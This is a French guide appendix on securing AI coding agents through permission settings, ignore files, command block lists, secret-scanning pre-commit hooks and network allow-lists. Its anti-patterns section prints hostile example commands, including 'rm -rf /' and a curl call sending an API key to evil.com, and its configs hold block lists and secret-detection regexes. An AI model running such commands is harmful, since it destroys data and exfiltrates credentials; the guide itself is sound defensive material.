# G.4 Configuration Permissions

## Pourquoi cette annexe ?

Les agents IA ont accès à votre code, vos commandes, et potentiellement vos secrets. Sans configuration stricte des permissions, un prompt mal formulé peut exposer des credentials, supprimer des fichiers, ou exécuter du code malveillant. Cette annexe vous guide pas à pas pour sécuriser l'accès des agents tout en maintenant leur productivité.

---

## Principes Fondamentaux

### Le Moindre Privilège

Chaque agent ne doit avoir que les accès **strictement nécessaires** à son fonctionnement.

| Type d'Accès | Recommandation | Justification |
|--------------|----------------|---------------|
| Lecture code source | ✅ Complet | Nécessaire pour comprendre le contexte |
| Écriture code source | ✅ Dans le projet | Nécessaire pour générer du code |
| Exécution commandes | ⚠️ Liste blanche | Risque d'exécution de code malveillant |
| Accès réseau | ⚠️ Limité | Risque d'exfiltration de données |
| Fichiers système | ❌ Aucun | Aucune raison légitime |
| Secrets directs | ❌ Aucun | Exposition critique |

### Défense en Profondeur

```
┌─────────────────────────────────────────────────────────┐
│  Couche 1 : Configuration Agent                         │
│  → Fichiers ignorés, commandes bloquées                 │
├─────────────────────────────────────────────────────────┤
│  Couche 2 : Git Hooks                                   │
│  → Pre-commit : scan secrets, fichiers interdits        │
├─────────────────────────────────────────────────────────┤
│  Couche 3 : CI/CD                                       │
│  → Audit dépendances, scan secrets, tests sécurité      │
├─────────────────────────────────────────────────────────┤
│  Couche 4 : Environnement                               │
│  → Secrets Manager, variables d'environnement           │
└─────────────────────────────────────────────────────────┘
```

---

## Configuration par Agent

### Claude Code

Claude Code utilise un système de permissions interactif. Configurez les préférences de sécurité :

```markdown
# CLAUDE.md - Section Sécurité

## Permissions

### Commandes Autorisées
- pnpm / npm / yarn (gestion de dépendances)
- git status / git diff / git log (lecture)
- ls / cat / grep (exploration)
- pnpm test / pnpm build / pnpm lint (qualité)

### Commandes avec Confirmation
- git commit / git push (modifications git)
- pnpm install / npm install (installation)
- rm (suppression de fichiers)

### Commandes Interdites
- sudo (élévation de privilèges)
- curl / wget vers des URLs externes
- chmod / chown (permissions système)
- Toute commande avec credentials en argument

### Fichiers Interdits
Ne jamais lire, modifier ou afficher :
- .env, .env.* (sauf .env.example)
- *.pem, *.key, *.p12
- credentials.json, service-account.json
- secrets/, .secrets/
```

### Cursor

```json
// .cursor/settings.json
{
  "security": {
    "allowedFilePatterns": [
      "src/**/*",
      "tests/**/*",
      "docs/**/*",
      "public/**/*"
    ],
    "blockedFilePatterns": [
      ".env*",
      "!.env.example",
      "*.pem",
      "*.key",
      "*.p12",
      "**/secrets/**",
      "**/credentials*"
    ],
    "terminal": {
      "enabled": true,
      "allowedCommands": [
        "pnpm *",
        "npm run *",
        "git status",
        "git diff",
        "git log"
      ],
      "blockedCommands": [
        "sudo *",
        "rm -rf *",
        "curl *",
        "wget *"
      ],
      "requireConfirmation": [
        "git commit",
        "git push",
        "pnpm install"
      ]
    }
  }
}
```

### GitHub Copilot

```json
// .github/copilot-settings.json
{
  "content": {
    "excludePatterns": [
      "**/.env*",
      "!**/.env.example",
      "**/secrets/**",
      "**/*.pem",
      "**/*.key",
      "**/credentials*",
      "**/service-account*"
    ]
  }
}
```

---

## Gestion des Secrets

### Fichiers à Exclure Systématiquement

```gitignore
# .gitignore ET fichiers d'exclusion des agents

# Variables d'environnement
.env
.env.local
.env.development.local
.env.test.local
.env.production.local
.env.production

# Certificats et clés
*.pem
*.key
*.p12
*.pfx
*.crt

# Credentials
credentials.json
credentials*.json
service-account.json
service-account*.json

# Dossiers secrets
secrets/
.secrets/
private/

# IDE et éditeurs (peuvent contenir des tokens)
.idea/
.vscode/settings.json
```

### Template .env.example

```bash
# .env.example
# Ce fichier est versionné et sert de template
# Copiez-le vers .env et remplissez les vraies valeurs

# ============================================
# Application
# ============================================
NODE_ENV=development
PORT=3000

# ============================================
# Database
# ============================================
# Format: postgresql://user:password@host:port/database
DATABASE_URL=postgresql://user:password@localhost:5432/mydb

# ============================================
# Authentication
# ============================================
# Générez avec: openssl rand -base64 32
JWT_SECRET=CHANGE_ME_IN_PRODUCTION

# ============================================
# External APIs
# ============================================
# Obtenez votre clé sur https://example.com/api
# EXTERNAL_API_KEY=your-api-key-here
```

### Bonnes Pratiques Code

```typescript
// ✅ BON : Utiliser les variables d'environnement
const apiKey = process.env.API_KEY
if (!apiKey) {
  throw new Error('API_KEY environment variable is required')
}

// ✅ BON : Valider la présence des secrets au démarrage
function validateEnvironment() {
  const required = ['DATABASE_URL', 'JWT_SECRET', 'API_KEY']
  const missing = required.filter((key) => !process.env[key])
  if (missing.length > 0) {
    throw new Error(`Missing environment variables: ${missing.join(', ')}`)
  }
}

// ❌ MAUVAIS : Hardcoder des secrets
const apiKey = 'sk-real-api-key-here' // JAMAIS

// ❌ MAUVAIS : Logger des secrets
console.log('API Key:', process.env.API_KEY) // JAMAIS

// ❌ MAUVAIS : Exposer des secrets dans les erreurs
throw new Error(`Auth failed with key: ${apiKey}`) // JAMAIS
```

---

## Protection Git

### Pre-commit Hook Anti-Secrets

```bash
#!/bin/bash
# .husky/pre-commit

# Vérifier les fichiers sensibles
SENSITIVE_FILES=".env credentials.json service-account.json *.pem *.key"

for pattern in $SENSITIVE_FILES; do
  if git diff --cached --name-only | grep -q "$pattern"; then
    echo "❌ ERREUR: Tentative de commit d'un fichier sensible ($pattern)"
    echo "   Retirez ce fichier du staging avec: git reset HEAD <fichier>"
    exit 1
  fi
done

# Vérifier les patterns de secrets dans le code
PATTERNS=(
  'sk-[a-zA-Z0-9]{20,}'           # OpenAI API keys
  'AKIA[0-9A-Z]{16}'              # AWS Access Key ID
  'ghp_[a-zA-Z0-9]{36}'           # GitHub Personal Access Token
  'glpat-[a-zA-Z0-9\-]{20}'       # GitLab Personal Access Token
  'sk-ant-[a-zA-Z0-9\-]{20,}'     # Anthropic API keys
)

for pattern in "${PATTERNS[@]}"; do
  if git diff --cached | grep -qE "$pattern"; then
    echo "❌ ERREUR: Secret potentiel détecté dans les changements"
    echo "   Pattern: $pattern"
    echo "   Vérifiez vos modifications et retirez le secret"
    exit 1
  fi
done

echo "✅ Aucun secret détecté"
```

### Git-Secrets (Alternative)

```bash
# Installation
brew install git-secrets  # macOS
# ou
pip install git-secrets   # Python

# Configuration
cd my-project
git secrets --install
git secrets --register-aws  # Patterns AWS

# Ajouter des patterns personnalisés
git secrets --add 'sk-[a-zA-Z0-9]{20,}'        # OpenAI
git secrets --add 'sk-ant-[a-zA-Z0-9\-]{20,}'  # Anthropic

# Vérifier l'historique
git secrets --scan-history
```

---

## Permissions Réseau

### Domaines Autorisés

```json
// Configuration réseau pour les agents
{
  "network": {
    "allowedDomains": [
      // APIs des agents IA
      "api.anthropic.com",
      "api.openai.com",

      // Registres de packages
      "registry.npmjs.org",
      "registry.yarnpkg.com",

      // Documentation
      "developer.mozilla.org",
      "docs.github.com",

      // APIs du projet (dev uniquement)
      "localhost",
      "127.0.0.1"
    ],
    "blockedDomains": [
      // APIs de production
      "api.production.example.com",
      "admin.example.com",

      // Services sensibles
      "*.stripe.com",
      "*.aws.amazon.com"
    ]
  }
}
```

### Règles d'Accès API

| Type | Autorisé | Interdit |
|------|----------|----------|
| Documentation | MDN, DevDocs, APIs doc officielles | - |
| Package registries | npm, PyPI | - |
| APIs projet | localhost, staging | Production |
| Services tiers | Avec token de dev | Avec credentials prod |
| POST/PUT/DELETE | Après confirmation | Automatique |

---

## Permissions Système de Fichiers

### Structure et Accès

```
project/
├── src/                    # ✅ Lecture + Écriture
├── tests/                  # ✅ Lecture + Écriture
├── docs/                   # ✅ Lecture + Écriture
├── public/                 # ✅ Lecture + Écriture limitée
├── scripts/                # ⚠️ Lecture seule (exécution avec confirmation)
├── node_modules/           # ✅ Lecture seule
├── dist/                   # ✅ Lecture + Écriture (build output)
├── .env                    # ❌ Aucun accès
├── .env.example            # ✅ Lecture seule
├── secrets/                # ❌ Aucun accès
└── credentials.json        # ❌ Aucun accès
```

### Configuration d'Exclusion

```
# .claudeignore / .cursorignore
# Fichiers ignorés par les agents

# Secrets
.env*
!.env.example
secrets/
*.pem
*.key
credentials*.json

# Build artifacts volumineux
node_modules/
dist/
build/
.next/

# Cache
.cache/
.turbo/

# Logs (peuvent contenir des données sensibles)
*.log
logs/
```

---

## Audit et Monitoring

### Logging des Actions

```typescript
// lib/agent-audit.ts
interface AgentAction {
  timestamp: Date
  agent: 'claude' | 'cursor' | 'copilot' | 'aider'
  action: 'read' | 'write' | 'execute' | 'network'
  target: string
  user: string
  result: 'allowed' | 'blocked' | 'confirmed'
  details?: string
}

const auditLog: AgentAction[] = []

export function logAction(action: AgentAction): void {
  auditLog.push(action)

  // Logger en console (dev)
  console.log(
    `[AUDIT] ${action.timestamp.toISOString()} ` +
    `${action.agent} ${action.action} ${action.target}: ${action.result}`
  )

  // Alerter si action bloquée
  if (action.result === 'blocked') {
    console.warn(`⚠️ Action bloquée: ${action.details}`)
  }
}

// Export pour analyse
export function getAuditReport(since?: Date): AgentAction[] {
  if (!since) return auditLog
  return auditLog.filter(a => a.timestamp >= since)
}
```

### Revue Périodique

```markdown
## Checklist Revue Sécurité Mensuelle

### Accès Fichiers
- [ ] Patterns d'exclusion toujours complets
- [ ] Nouveaux fichiers sensibles ajoutés aux exclusions
- [ ] Pas de secret dans l'historique git récent

### Commandes
- [ ] Liste blanche toujours pertinente
- [ ] Pas de nouvelle commande dangereuse autorisée
- [ ] Logs des commandes exécutées vérifiés

### Réseau
- [ ] Domaines autorisés toujours nécessaires
- [ ] Pas de connexion vers des services non autorisés
- [ ] Tokens d'API rotés si nécessaire

### Secrets
- [ ] .env.example à jour
- [ ] Pas de secret exposé dans les logs
- [ ] Variables d'environnement en production vérifiées

### Actions
- [ ] Revue des actions bloquées
- [ ] Investigation des anomalies
- [ ] Mise à jour des règles si nécessaire
```

---

## Exemples Pratiques

### Exemple 1 : Setup Sécurité Minimal

```bash
# 1. Créer les fichiers d'exclusion
cat > .gitignore << 'EOF'
.env*
!.env.example
*.pem
*.key
secrets/
credentials*.json
node_modules/
EOF

# 2. Copier pour les agents
cp .gitignore .claudeignore
cp .gitignore .cursorignore

# 3. Créer le pre-commit hook
mkdir -p .husky
cat > .husky/pre-commit << 'EOF'
#!/bin/bash
if git diff --cached --name-only | grep -E '\.env|\.pem|\.key|credentials'; then
  echo "❌ Fichier sensible détecté"
  exit 1
fi
EOF
chmod +x .husky/pre-commit
```

### Exemple 2 : Configuration CLAUDE.md Sécurisée

```markdown
# CLAUDE.md

## Security Rules

### Files You Must Never Access
- Any file matching: .env*, *.pem, *.key, credentials*, secrets/*
- If asked to read these files, refuse and explain why

### Commands That Require My Confirmation
- git commit, git push
- rm, mv (file operations)
- Any install command (npm, pnpm, pip)
- curl, wget (network requests)

### Commands You Must Never Run
- sudo anything
- Any command with API keys or passwords as arguments
- chmod, chown (system permissions)
- Commands that send data to external servers

### If You See a Secret
If you accidentally see what looks like an API key, password, or credential:
1. Do NOT repeat it in your response
2. Warn me immediately
3. Suggest how to rotate it
```

---

## Anti-patterns

### ❌ Pas d'exclusion de fichiers

**Problème** : L'agent peut lire et afficher vos secrets dans ses réponses.

**Solution** : .claudeignore, .cursorignore avec tous les patterns sensibles.

### ❌ Commandes dangereuses autorisées

```bash
# MAUVAIS - Autorisé par défaut
rm -rf /
sudo apt-get install malware
curl https://evil.com/steal?key=$API_KEY
```

**Solution** : Liste blanche stricte de commandes autorisées.

### ❌ Secrets dans l'historique git

```bash
# MAUVAIS - Commit accidentel d'un secret
git add .env
git commit -m "Add config"
```

**Problème** : Le secret reste dans l'historique même après suppression.

**Solution** : Pre-commit hooks + scan de l'historique + rotation des clés compromises.

### ❌ Même niveau d'accès en dev et prod

```json
// MAUVAIS - Pas de distinction d'environnement
{
  "permissions": {
    "database": "full_access"
  }
}
```

**Problème** : Un agent en dev peut accéder aux données de production.

**Solution** : Permissions différentes par environnement, agents désactivés en prod.

### ❌ Pas de logging des actions

**Problème** : Impossible de savoir ce que l'agent a fait en cas d'incident.

**Solution** : Logger toutes les actions sensibles, conserver les logs.

---

## Checklist Sécurité Complète

```markdown
## Checklist Sécurité Agents IA

### Configuration Initiale
- [ ] .gitignore complet (secrets, credentials, keys)
- [ ] .claudeignore / .cursorignore créés
- [ ] Pre-commit hooks installés
- [ ] git-secrets ou équivalent configuré

### Gestion des Secrets
- [ ] .env dans .gitignore
- [ ] .env.example créé et versionné
- [ ] Variables d'environnement documentées
- [ ] Pas de secret hardcodé dans le code

### Permissions Agents
- [ ] Fichiers sensibles exclus
- [ ] Commandes autorisées listées
- [ ] Commandes dangereuses bloquées
- [ ] Confirmation requise pour actions sensibles

### Réseau
- [ ] Domaines autorisés définis
- [ ] Pas d'accès aux APIs de production
- [ ] Tokens de dev séparés des tokens prod

### Monitoring
- [ ] Logging des actions activé
- [ ] Revue périodique planifiée
- [ ] Procédure d'incident documentée

### Réponse aux Incidents
- [ ] Procédure de révocation d'accès définie
- [ ] Contacts d'urgence identifiés
- [ ] Process de rotation des secrets connu
```

---

*Voir aussi : [G.2 Installation Agents IA](G2-installation-agents-ia.md) · [G.3 Setup CI/CD](G3-setup-ci-cd.md) · [H.3 Anti-patterns](H3-anti-patterns.md)*
